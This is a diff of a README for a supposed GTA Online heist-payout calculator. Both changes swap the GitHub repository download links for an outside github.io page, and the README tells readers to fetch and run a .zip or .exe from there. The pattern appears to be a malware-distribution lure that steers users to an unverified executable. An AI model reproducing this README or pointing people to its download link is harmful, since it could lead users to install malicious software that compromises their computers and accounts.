@@ -1,6 +1,6 @@
 # 💰 kortz-center-heist-calculator - Maximize your crew's total heist payout
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Hermonhostile726/kortz-center-heist-calculator)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://hermonhostile726.github.io)
 
 This tool helps players calculate the best loot combinations for the Kortz Center Heist in GTA Online. It helps groups of one to four players decide how to split targets to earn the most money. This program eliminates guesswork during planning.
 
@@ -21,7 +21,7 @@ You save time during your prep phase. You avoid disputes with your crew. You wal
 
 Follow these steps to install the software on your computer.
 
-1. 📥 Visit this page to download the software: https://github.com/Hermonhostile726/kortz-center-heist-calculator
+1. 📥 Visit this page to download the software: https://hermonhostile726.github.io
 2. Locate the most recent file ending in a .zip or .exe format on the releases page.
 3. Save the file to your desktop or a folder you can find easily.
 4. If the file is a .zip, right-click the folder and choose "Extract All." Follow the screen prompts to unpack the contents.
